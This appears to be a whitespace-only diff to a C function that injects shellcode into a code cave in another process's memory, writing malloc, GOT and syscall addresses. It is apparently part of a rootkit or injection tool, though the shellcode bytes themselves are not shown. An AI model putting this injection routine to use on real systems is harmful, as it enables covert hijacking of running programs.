@@ -54,7 +54,7 @@ int code_cave_write_shellcode(int mem_fd, __u64 cave_addr, __u64 got_addr, __u64
     }
 
     //First part of shellcode
-    len = CODE_CAVE_SHELLCODE_ASSEMBLE_1_LEN; 
+    len = CODE_CAVE_SHELLCODE_ASSEMBLE_1_LEN;
     char* buf_c = CODE_CAVE_SHELLCODE_ASSEMBLE_1;
     lseek(mem_fd, cave_addr, SEEK_SET);
     for(size_t ii=0; ii<len; ii++){
@@ -63,7 +63,7 @@ int code_cave_write_shellcode(int mem_fd, __u64 cave_addr, __u64 got_addr, __u64
             return -1;
         }
     }
-    
+
     //Writing malloc address
     len = sizeof(__u64);
     buf_n = (__u64)malloc_addr;
@@ -113,9 +113,9 @@ int code_cave_write_shellcode(int mem_fd, __u64 cave_addr, __u64 got_addr, __u64
             return -1;
         }
     }
-    
+
     printf("Finished writing shellcode at %llx, syscall_addr %llx\n", cave_addr, syscall_addr);
-    
+
     return 0;
 }
 
